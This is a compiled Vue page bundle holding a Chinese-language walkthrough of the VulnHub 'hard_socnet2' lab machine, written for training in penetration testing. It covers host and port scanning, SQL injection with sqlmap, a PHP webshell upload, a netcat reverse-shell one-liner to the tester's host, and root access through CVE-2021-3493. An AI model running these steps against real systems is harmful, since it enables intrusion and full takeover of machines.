import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as s,e as i}from"./app-916f4302.js";const t="/assets/image-20230917163604722-009c075f.png",n="/assets/image-20230917163630729-1603b608.png",p="/assets/image-20230917163754246-ec4365c7.png",d="/assets/image-20230917164139202-00130789.png",r="/assets/image-20230917164221569-819d1d4e.png",c="/assets/image-20230918165631466-ce268776.png",l="/assets/image-20230918165744131-ecedf6ed.png",m="/assets/image-20230918165833247-46f75008.png",o="/assets/image-20230918170304999-31574664.png",g="/assets/image-20230918170833512-13150335.png",u="/assets/image-20230918172431434-75934064.png",h={},v=i(`<h1 id="下载地址" tabindex="-1"><a class="header-anchor" href="#下载地址" aria-hidden="true">#</a> 下载地址</h1><p>https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</p><h1 id="靶机目标" tabindex="-1"><a class="header-anchor" href="#靶机目标" aria-hidden="true">#</a> 靶机目标</h1><p>获取靶机root权限</p><h1 id="详细步骤" tabindex="-1"><a class="header-anchor" href="#详细步骤" aria-hidden="true">#</a> 详细步骤</h1><h2 id="主机发现" tabindex="-1"><a class="header-anchor" href="#主机发现" aria-hidden="true">#</a> 主机发现</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>arp-scan -l -I eth1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+t+`" alt="image-20230917163604722"></p><p>然后扫描端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nmap -sV -p- 192.168.56.109
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+n+'" alt="image-20230917163630729"></p><p>发现80，8000都是开放的，访问80端口</p><h2 id="web信息收集" tabindex="-1"><a class="header-anchor" href="#web信息收集" aria-hidden="true">#</a> web信息收集</h2><p><img src="'+p+'" alt="image-20230917163754246"></p><p>发现有登录和注册功能，尝试弱口令和万能密码，无果，注册一个账号试试看</p><p>注册后，成功进入界面，测试功能点，发现主页可以上传文件，搜索框存在sql注入</p><p><img src="'+d+'" alt="image-20230917164139202"></p><p><img src="'+r+'" alt="image-20230917164221569"></p><p>先尝试sql注入，直接用sqlmap跑</p><p>发现能跑出所有数据</p><p><img src="'+c+'" alt="image-20230918165631466"></p><p>发现有管理员的账号和密码，但是登录后无果</p><p>随后发现文件上传点</p><p><img src="'+l+'" alt="image-20230918165744131"></p><p>可以直接上传.php木马</p><p>通过蚁剑连接</p><p><img src="'+m+'" alt="image-20230918165833247"></p><p>查看用户权限，发现是普通用户权限，尝试提权</p><p>使用CVE-2021-3493漏洞提权</p><p><img src="'+o+'" alt="image-20230918170304999"></p><p>把exploit.c传入/var/tmp目录下</p><p>在蚁剑的虚拟终端反弹shell进一步提升可操作权限</p><p><img src="'+g+`" alt="image-20230918170833512"></p><p>目标机</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc 192.168.56.103 7777 | /bin/sh | nc 192.168.56.103 8888 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>kali机</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc -lvvp 7777
nc -lvvp 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>进入/var/tmp目录下，编译exploit.c</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>gcc -o exp exploit.c
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>给权限并运行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>chmod +x exp
./exp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+u+'" alt="image-20230918172431434"></p><p>成功取得root权限！</p>',43),_=[v];function x(b,f){return a(),s("div",null,_)}const q=e(h,[["render",x],["__file","03vulnhub-hard-socnet2.html.vue"]]);export{q as default};
